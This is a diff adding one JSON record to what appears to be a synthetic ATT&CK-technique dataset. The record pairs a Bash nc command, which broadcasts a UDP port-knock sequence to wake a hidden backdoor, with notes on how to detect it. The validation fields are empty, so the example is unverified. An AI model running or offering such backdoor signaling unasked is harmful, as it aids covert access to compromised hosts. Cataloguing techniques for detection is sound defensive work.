@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "for p in 4000 4010 4020; do echo -n \"KNOCK$(printf %02d \"$p\")\" | nc -u -w1 192.0.2.255 \"$p\"; sleep 0.2; done",
+  "explanation": "Broadcasts a short UDP knock sequence with simple payload tags across three ports to signal presence to any listening backdoor. Detection: monitor broadcast traffic spikes and repeated sequences across adjacent high ports.",
+  "rationale_steps": [
+    "Generates discrete UDP packets with identifiable, but unobfuscated, markers.",
+    "Targets broadcast to reach hidden listeners without knowing exact hosts.",
+    "Uses timing to preserve order of the knock.",
+    "Detect via IDS rules for repeated broadcast knocks and unusual high-port UDP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-753dbc1f-bc595d5c",
+  "source_prompt_hash": "753dbc1f",
+  "timestamp_utc": "2025-09-30T05:37:53.725688Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
